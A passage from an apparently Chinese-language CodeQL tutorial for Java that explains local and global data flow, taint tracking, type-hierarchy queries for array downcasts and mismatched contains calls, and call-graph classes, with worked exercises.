class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call, Expr src</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; fileReader and</span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure><p>寻找公共参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call, Parameter p</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; fileReader and</span><br><span class="line">  DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select p</span><br></pre></td></tr></table></figure><p>This query finds calls to formatting functions where the format string is not hard-coded：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.StringFormat</span><br><span class="line"></span><br><span class="line">from StringFormatMethod format, MethodAccess call, Expr formatString</span><br><span class="line">where</span><br><span class="line">  call.getMethod() &#x3D; format and</span><br><span class="line">  call.getArgument(format.getFormatStringIndex()) &#x3D; formatString and</span><br><span class="line">  not exists(DataFlow::Node source, DataFlow::Node sink |</span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr() instanceof StringLiteral and</span><br><span class="line">    sink.asExpr() &#x3D; formatString</span><br><span class="line">  )</span><br><span class="line">select call, &quot;Argument to String format method isn&#39;t hard-coded.&quot;</span><br></pre></td></tr></table></figure><h3 id="Global-data-flow"><a href="#Global-data-flow" class="headerlink" title="Global data flow"></a>Global data flow</h3><p>more powerful than local data flow, less precise than local data flow, need more time and memory to perform.</p><h4 id="Using-global-data-flow"><a href="#Using-global-data-flow" class="headerlink" title="Using global data flow"></a>Using global data flow</h4><p>对<code>DataFlow::Configuration</code>进行继承，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class MyDataFlowConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; this &#x3D; &quot;MyDataFlowConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>override内部定义的谓词；</p><ol><li>isSource 从哪流来 from</li><li>isSink 流向哪里to</li><li>isBarrier 可选 限制数据流</li><li>isAdditionalFlowStep 可选，添加额外的流程步骤</li></ol><p>可以使用<code>hasFlow</code>谓词去寻找数据流：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where dataflow.hasFlow(source, sink)</span><br><span class="line">select source, &quot;Data flow to $@.&quot;, sink, sink.toString()</span><br></pre></td></tr></table></figure><h4 id="Using-global-taint-tracking"><a href="#Using-global-taint-tracking" class="headerlink" title="Using global taint tracking"></a>Using global taint tracking</h4><p>对<code>TaintTracking::Configuration</code>进行继承：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this &#x3D; &quot;MyTaintTrackingConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>override内部定义的谓词；</p><ol><li>isSource 污点数据从哪流来 from</li><li>isSink 污点数据流向哪里to</li><li>isBarrier 可选 限制数据流</li><li>isAdditionalFlowStep 可选，添加额外的流程步骤</li></ol><p>也可以使用<code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>谓词去寻找数据流：</p><h4 id="Flow-sources"><a href="#Flow-sources" class="headerlink" title="Flow sources"></a>Flow sources</h4><p>数据库流包含一些预定义的流源。<code>semmle.code.java.dataflow.FlowSources</code>包中定义的类<code>RemoteFlowSource</code>表示的是那些可以由远程用户控制的数据源，这对查找安全问题有很大帮助。</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>寻找用户输入源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123;</span><br><span class="line">    this &#x3D; &quot;...&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四道练习题"><a href="#四道练习题" class="headerlink" title="四道练习题"></a>四道练习题</h3><h4 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h4><p>Write a query that finds all hard-coded strings used to create a <code>java.net.URL</code>, using local data flow.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor url, Call call, StringLiteral src</span><br><span class="line">where </span><br><span class="line">url.getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; url and</span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure><h4 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h4><p>Write a query that finds all hard-coded strings used to create a <code>java.net.URL</code>, using global data flow.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class Configuration extends DataFlow::Configuration &#123;</span><br><span class="line">  Configuration() &#123;</span><br><span class="line">    this &#x3D; &quot;LiteralToURL Configuration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof StringLiteral</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Call call |</span><br><span class="line">      sink.asExpr() &#x3D; call.getArgument(0) and</span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node src, DataFlow::Node sink, Configuration config</span><br><span class="line">where config.hasFlow(src, sink)</span><br><span class="line">select src, &quot;This string constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h4 id="Exercises-3"><a href="#Exercises-3" class="headerlink" title="Exercises 3"></a>Exercises 3</h4><p>Write a class that represents flow sources from <code>java.lang.System.getenv(..)</code>. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">class GetenvSource extends MethodAccess&#123;</span><br><span class="line">GetenvSource() &#123;</span><br><span class="line">    exists(Method m | m &#x3D; this.getMethod() |</span><br><span class="line">      m.hasName(&quot;getenv&quot;) and</span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Exercises-4"><a href="#Exercises-4" class="headerlink" title="Exercises 4"></a>Exercises 4</h4><p>Using the answers from 2 and 3, write a query which finds all global data flows from <code>getenv</code> to <code>java.net.URL</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    exists(Method m | m &#x3D; this.asExpr().(MethodAccess).getMethod() |</span><br><span class="line">      m.hasName(&quot;getenv&quot;) and</span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetenvToURLConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  GetenvToURLConfiguration() &#123;</span><br><span class="line">    this &#x3D; &quot;GetenvToURLConfiguration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof GetenvSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Call call |</span><br><span class="line">      sink.asExpr() &#x3D; call.getArgument(0) and</span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node src, DataFlow::Node sink, GetenvToURLConfiguration config</span><br><span class="line">where config.hasFlow(src, sink)</span><br><span class="line">select src, &quot;This environment variable constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h2 id="Types-in-Java"><a href="#Types-in-Java" class="headerlink" title="Types in Java"></a>Types in Java</h2><p>PrimitiveType 基础类型</p><p>RefType 引用类型 类、接口、数组、注解、枚举</p><p>CodeQL提供的RefType 类内部有成员谓词： <code>getASupertype</code> and <code>getASubtype</code> 用来去定位当前元素类型的父类和子类。</p><p>例如下面这个结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125;</span><br><span class="line"></span><br><span class="line">interface I &#123;&#125;</span><br><span class="line"></span><br><span class="line">class B extends A implements I &#123;&#125;</span><br></pre></td></tr></table></figure><p>寻找B类的全部父类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class B</span><br><span class="line">where B.hasName(&quot;B&quot;)</span><br><span class="line">select B.getASuperType+()</span><br></pre></td></tr></table></figure><p>返回的结果是A、I、和java.lang.Object()</p><p>除了这些，还提供：</p><p>谓词<code>getAMember</code>去获得类内声明的成分，例如field、cons、methods</p><p>谓词<code>inherits(Method m)</code> 可以去判断m方法是否是该type声明或者继承的。</p><h3 id="举例：数组的向下转型"><a href="#举例：数组的向下转型" class="headerlink" title="举例：数组的向下转型"></a>举例：数组的向下转型</h3><p>数组的向下转型通常是危险的，容易引发运行时异常。</p><p>危险：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o &#x3D; new Object[] &#123; &quot;Hello&quot;, &quot;world&quot; &#125;;</span><br><span class="line">String[] s &#x3D; (String[])o;</span><br></pre></td></tr></table></figure><p>检测思想，如果source是target的传递父类，那么就是不安全的。</p><p>初级版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from CastExpr ce, Array source , Array target</span><br><span class="line">where </span><br><span class="line">source &#x3D; ce.getExpr().getType() and</span><br><span class="line">target &#x3D; ce.getType() and</span><br><span class="line">target.getElementType().(RefType).getASupertype+() &#x3D; source.getElementType()</span><br><span class="line">select ce,&quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><p>但是，对于这个例子就会误报：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List l &#x3D; new ArrayList();</span><br><span class="line">&#x2F;&#x2F; add some elements of type A to l</span><br><span class="line">A[] as &#x3D; (A[])l.toArray(new A[0]);</span><br></pre></td></tr></table></figure><p>升级一下，所有是<code>Collection.toArray()</code>的方法或者override版本都不算。</p><p>升级版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** class representing java.util.Collection.toArray(T[]) *&#x2F;</span><br><span class="line">class CollectionToArray extends Method &#123;</span><br><span class="line">    CollectionToArray() &#123;</span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;) and</span><br><span class="line">        this.hasName(&quot;toArray&quot;) and</span><br><span class="line">        this.getNumberOfParameters() &#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;** class representing calls to java.util.Collection.toArray(T[]) *&#x2F;</span><br><span class="line">class CollectionToArrayCall extends MethodAccess &#123;</span><br><span class="line">    CollectionToArrayCall() &#123;</span><br><span class="line">        exists(CollectionToArray m |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overridesOrInstantiates*(m)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;** the call&#39;s actual return type, as determined from its argument *&#x2F;</span><br><span class="line">    Array getActualReturnType() &#123;</span><br><span class="line">        result &#x3D; this.getArgument(0).getType()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终版本：</p><p>刨除掉那些对类型为A[]的对象调用toArray，然后将其再转型到A[]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Insert the class definitions from above</span><br><span class="line"></span><br><span class="line">from CastExpr ce, Array source, Array target</span><br><span class="line">where source &#x3D; ce.getExpr().getType() and</span><br><span class="line">    target &#x3D; ce.getType() and</span><br><span class="line">    target.getElementType().(RefType).getASupertype+() &#x3D; source.getElementType() and</span><br><span class="line">    not ce.getExpr().(CollectionToArrayCall).getActualReturnType() &#x3D; target</span><br><span class="line">select ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><h3 id="举例：查找不匹配的包含检查"><a href="#举例：查找不匹配的包含检查" class="headerlink" title="举例：查找不匹配的包含检查"></a>举例：查找不匹配的包含检查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; zkProp;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">if (zkProp.entrySet().contains(&quot;dynamicConfigFile&quot;))&#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种当然是没有意义的。</p><p>一般来说，我们想找到对Collection.contains的调用（或者在Collection的任何参数化实例中的任何重写方法），使得集合元素的类型E和Contains参数的类型A不相关，也就是说，它们没有共同的子类型。</p><p>第一步，描述<code>java.util.Collection</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollection extends GenericInterface &#123;</span><br><span class="line">    JavaUtilCollection() &#123;</span><br><span class="line">        this.hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，描述<code>java.util.Collection.contains</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollectionContains extends Method &#123;</span><br><span class="line">    JavaUtilCollectionContains() &#123;</span><br><span class="line">        this.getDeclaringType() instanceof JavaUtilCollection and</span><br><span class="line">        this.hasStringSignature(&quot;contains(Object)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步，找到调用了<code>Collection.contains</code>的方法，包括任何override它的方法，并考虑所有参数化实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollectionContainsCall extends MethodAccess &#123;</span><br><span class="line">    JavaUtilCollectionContainsCall() &#123;</span><br><span class="line">        exists(JavaUtilCollectionContains jucc |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overrides*(jucc)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对每个contains方法的调用，我们关心的是两点：</p><ol><li>参数的类型</li><li>被调用集合的元素类型</li></ol><p>我们需要在第三步这个类中增加两个谓词；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type getArgumentType() &#123;</span><br><span class="line">    result &#x3D; this.getArgument(0).getType()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Type getCollectionElementType() &#123;</span><br><span class="line">    exists(RefType D, ParameterizedInterface S |</span><br><span class="line">        D &#x3D; this.getMethod().getDeclaringType() and</span><br><span class="line">        D.hasSupertype*(S) and S.getSourceDeclaration() instanceof JavaUtilCollection and</span><br><span class="line">        result &#x3D; S.getTypeArgument(0)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写一个谓词来检查两个给定的引用类型是否有一个共同的子类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predicate haveCommonDescendant(RefType tp1, RefType tp2) &#123;</span><br><span class="line">    exists(RefType commondesc | commondesc.hasSupertype*(tp1) and commondesc.hasSupertype*(tp2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Insert the class definitions from above</span><br><span class="line"></span><br><span class="line">from JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line">where collEltType &#x3D; juccc.getCollectionElementType() and argType &#x3D; juccc.getArgumentType() and</span><br><span class="line">    not haveCommonDescendant(collEltType, argType)</span><br><span class="line">select juccc, &quot;Element type &quot; + collEltType + &quot; is incompatible with argument type &quot; + argType</span><br></pre></td></tr></table></figure><h5 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h5><p>对于许多程序来说，由于类型变量和通配符的原因，这个查询产生了大量的false positive结果。</p><ol><li>就像一开始的这个例子，避免误报我们需要帮助我们去让<code>collEltType</code>和<code>argType</code>都不是<code>TypeVariable</code>的实例。</li><li>避免自动装箱，int和Integer不是一个，我们需要保证的是<code>collEltType</code>不是<code>argType</code>的装箱类型。</li><li>null是特例，他的type在CodeQL里面是<code>&lt;nulltype&gt;</code>，需要考虑</li></ol><p>最终版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Insert the class definitions from above</span><br><span class="line"></span><br><span class="line">from JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line">where collEltType &#x3D; juccc.getCollectionElementType() and argType &#x3D; juccc.getArgumentType() and</span><br><span class="line">    not haveCommonDescendant(collEltType, argType) and</span><br><span class="line">    not collEltType instanceof TypeVariable and not argType instanceof TypeVariable and</span><br><span class="line">    not collEltType &#x3D; argType.(PrimitiveType).getBoxedType() and</span><br><span class="line">    not argType.hasName(&quot;&lt;nulltype&gt;&quot;)</span><br><span class="line">select juccc, &quot;Element type &quot; + collEltType + &quot; is incompatible with argument type &quot; + argType</span><br></pre></td></tr></table></figure><h2 id="Navigating-the-call-graph"><a href="#Navigating-the-call-graph" class="headerlink" title="Navigating the call graph"></a>Navigating the call graph</h2><h3 id="调用图类"><a href="#调用图类" class="headerlink" title="调用图类"></a>调用图类</h3><p>CodeQL提供了两个抽象类：<code>Callable</code>和<code>Call</code></p><p>Callable只是Method和Constructor的共同父类，</p><p>Call是MethodAccess、ClassInstanceExpression、ThisConstructorInvocationStmt、SuperConstructorInvocationStmt的共同父类。</p><p><strong>简单的说，Callable是可以被调用的东西，Call是可以调用Callable的东西。</strong></p><p>Call提供了两个谓词：</p><ul><li>getCallee 返回的是静态层面被调用的方法。对于非静态方法，运行时实际会是子类override的方法。</li><li>getCaller 返回的是语法上发起调用的方法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class Super &#123;</span><br><span class="line">    int x;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public Super() &#123;</span><br><span class="line">        this(23);       &#x2F;&#x2F; call</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public Super(int x) &#123;</span><br><span class="line">        this.x &#x3D; x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public int getX() &#123;</span><br><span class="line">        return x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sub extends Super &#123;</span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public Sub(int x) &#123;</span><br><span class="line">        super(x+19);    &#x2F;&#x2F; call</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public int getX() &#123;</span><br><span class="line">        return x-19;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Client &#123;</span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Super s &#x3D; new Sub(42);  &#x2F;&#x2F; call</span><br><span class="line">        s.getX();               &#x2F;&#x2F; call </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Call提供了两种成员谓词：</p><ol><li><code>getCallee</code>返回的是静态解析这次调用的结果（Callable）。</li><li><code>getCaller</code>返回的是调用者。</li></ol><p>就像Client.main的第二行getCallee() 发挥的结果是 